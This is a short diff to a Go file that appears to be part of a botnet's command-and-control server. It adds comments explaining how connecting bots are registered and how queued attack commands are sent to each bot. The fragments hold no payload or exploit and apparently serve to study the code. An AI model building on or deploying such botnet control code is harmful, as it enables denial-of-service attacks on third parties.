@@ -1,3 +1,7 @@
+/*
+
+*/
+
 package main
 
 import (
@@ -16,6 +20,10 @@ func NewBot(conn net.Conn, version byte, source string) *Bot {
     return &Bot{-1, conn, version, source}
 }
 
+
+/*
+Called by initialHandler in main.go, when new bot connects to C&C
+*/
 func (this *Bot) Handle() {
     clientList.AddClient(this)
     defer clientList.DelClient(this)
@@ -32,6 +40,7 @@ func (this *Bot) Handle() {
     }
 }
 
+/* C&C send queued attack command to each bot */
 func (this *Bot) QueueBuf(buf []byte) {
     this.conn.Write(buf)
 }
